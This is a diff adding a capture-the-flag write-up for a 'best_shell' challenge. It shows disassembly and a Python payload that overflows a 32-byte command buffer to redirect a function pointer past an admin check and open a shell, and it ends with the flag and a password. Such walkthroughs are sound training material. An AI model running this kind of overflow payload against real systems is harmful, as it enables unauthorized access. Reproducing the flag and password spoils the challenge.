@@ -1,0 +1,54 @@
+First off, thank god for Stack Overflow or else I would never have known this: http://stackoverflow.com/questions/12469554/piping-input-to-a-shell-command-and-keeping-the-created-shell-alive
+    Basically this teaches you how to keep the shell running so that when you pipe into the program and exploit it, the shell is still open in stdin
+
+Best Shell is pretty neat and we must take advantage of the rename function
+Basically, if we overflow the cmd[32], we can change the pointer of the command that is run. This allows us to jump the code to wherever we want. In this gave, we want to jump to the point in give_shell that is after the admin check.
+
+With an objdump -d best_shell, we get:
+
+080489c6 <shell_handler>:
+ 80489c6:	55                   	push   %ebp
+ 80489c7:	89 e5                	mov    %esp,%ebp
+ 80489c9:	83 ec 28             	sub    $0x28,%esp
+ 80489cc:	0f b6 05 85 b0 04 08 	movzbl 0x804b085,%eax
+ 80489d3:	84 c0                	test   %al,%al
+ 80489d5:	74 2f                	je     8048a06 <shell_handler+0x40>
+ 80489d7:	e8 24 fc ff ff       	call   8048600 <getegid@plt>
+ 80489dc:	89 45 f4             	mov    %eax,-0xc(%ebp)
+ 80489df:	8b 45 f4             	mov    -0xc(%ebp),%eax
+ 80489e2:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80489e6:	8b 45 f4             	mov    -0xc(%ebp),%eax
+ 80489e9:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 80489ed:	8b 45 f4             	mov    -0xc(%ebp),%eax
+ 80489f0:	89 04 24             	mov    %eax,(%esp)
+ 80489f3:	e8 a8 fc ff ff       	call   80486a0 <setresgid@plt>
+ 80489f8:	c7 04 24 a3 8e 04 08 	movl   $0x8048ea3,(%esp)
+ 80489ff:	e8 2c fc ff ff       	call   8048630 <system@plt>
+ 8048a04:	eb 0c                	jmp    8048a12 <shell_handler+0x4c>
+ 8048a06:	c7 04 24 ab 8e 04 08 	movl   $0x8048eab,(%esp)
+ 8048a0d:	e8 0e fc ff ff       	call   8048620 <puts@plt>
+ 8048a12:	c9                   	leave  
+ 8048a13:	c3                   	ret    
+
+The line that is interesting is located at 0x80489d7, which is right after the jump statement (this jump is the else portion of the if (admin)).
+So, we want the renamed command to point to 0x80489d7.
+
+In this case we will run rename on lol.
+
+python -c 'print "rename lol " + "A"*32 + "\xd7\x89\x04\x08" + "\n" + "A"*32 + "\xd7\x89\x04\x08"'
+
+Note that after the rename, we must run lol again, which is now called "A"*32 + \xd7\x89\x04\x08. However, if we simply pipe this into /home/best_shell/best_shell, it won't work because the stdin is closed in the shell right after the program runs.
+
+So, let's redirect the output of the python command to best_shell.txt
+
+And then run:
+    cat best_shell.txt - | /home/best_shell/best_shell
+                       ^ This is to keep stdin open so that we can run commands in the shell
+
+Once we are in the shell, we can find the flag!
+
+FLAG: give_shell_was_useful
+
+
+And for fun:
+PASSWORD: fbc3799d2e3f1739
